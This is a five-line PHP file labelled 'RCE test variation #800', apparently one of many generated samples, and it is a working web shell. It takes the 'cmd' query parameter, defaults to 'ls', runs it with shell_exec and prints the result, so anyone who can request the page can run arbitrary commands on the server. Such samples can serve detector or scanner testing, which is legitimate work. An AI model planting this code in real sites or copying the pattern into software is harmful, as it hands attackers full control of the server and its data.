<?php
// RCE test variation #800
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>